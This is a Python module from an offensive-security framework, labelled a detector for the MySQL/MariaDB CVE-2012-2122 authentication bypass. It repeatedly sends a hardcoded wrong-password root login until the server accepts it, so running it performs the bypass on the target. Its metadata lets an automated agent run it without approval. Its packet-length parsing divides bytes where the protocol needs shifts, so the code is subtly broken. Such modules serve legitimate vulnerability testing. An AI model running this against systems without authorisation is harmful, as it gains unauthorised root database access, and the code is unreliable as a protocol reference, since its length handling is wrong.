#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MySQL/MariaDB memcmp authentication bypass (CVE-2012-2122)."""

import socket
import struct

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'MySQL/MariaDB - Auth Bypass Detection (CVE-2012-2122)',
        'description': (
            'Detects CVE-2012-2122 by repeatedly attempting root login with a wrong '
            'password until memcmp returns success (or max attempts).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'mysql', 'mariadb', 'cve', 'cve2012', 'auth-bypass', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 100,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals'],
            'cost': 1.5,
            'noise': 0.7,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-2122',
        ],
        'cve': 'CVE-2012-2122',
    }

    port = OptPort(3306, 'MySQL port', True)
    max_attempts = OptInteger(300, 'Max login attempts', required=False, advanced=True)

    def _login_packet(self) -> bytes:
        # Same static wrong password auth packet as NASL (root / mysql_native_password)
        body = bytes([
            0x05, 0xa6, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x01, 0x21,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00,
        ]) + b'root\x00' + bytes([0x14]) + bytes([
            0x26, 0xcd, 0x8e, 0x6a, 0x43, 0x44, 0x61, 0x21, 0xe7, 0x96,
            0x8b, 0x18, 0xc3, 0xdc, 0x55, 0xcc, 0x5d, 0xd6, 0xa3, 0xb0,
        ]) + b'mysql_native_password\x00'
        # packet: length (3) + seq(1) + body — NASL used 0x50 length
        hdr = struct.pack('<I', len(body))[:3] + bytes([0x01])
        return hdr + body

    def _attempt(self, host: str, port: int, pkt: bytes) -> str:
        try:
            sock = socket.create_connection((host, port), timeout=self._timeout())
            sock.settimeout(self._timeout())
            # greeting
            hdr = sock.recv(4)
            if len(hdr) < 4:
                sock.close()
                return 'fail'
            plen = hdr[0] + (hdr[1] // 8) + (hdr[2] // 16)
            sock.recv(plen)
            sock.sendall(pkt)
            rh = sock.recv(4)
            if len(rh) < 4:
                sock.close()
                return 'fail'
            blen = rh[0] + (rh[1] // 8) + (rh[2] // 16)
            body = sock.recv(blen)
            sock.close()
            if len(body) < 5:
                return 'fail'
            errno = (body[2] << 8) | body[1]
            if errno == 0 and body[0] == 0 and body[3] == 2 and body[4] == 0:
                return 'ok'
            if errno == 1045:
                return 'denied'
            return 'other'
        except Exception:
            return 'fail'

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host, port):
            return False
        pkt = self._login_packet()
        # first check that wrong password yields 1045
        first = self._attempt(host, port, pkt)
        if first != 'denied':
            return False
        attempts = int(self.max_attempts or 300)
        for _ in range(attempts):
            if self._attempt(host, port, pkt) == 'ok':
                self.set_info(
                    severity='critical',
                    reason='MySQL/MariaDB auth bypass (CVE-2012-2122)',
                    path=f'tcp/{port}',
                )
                return True
        return False
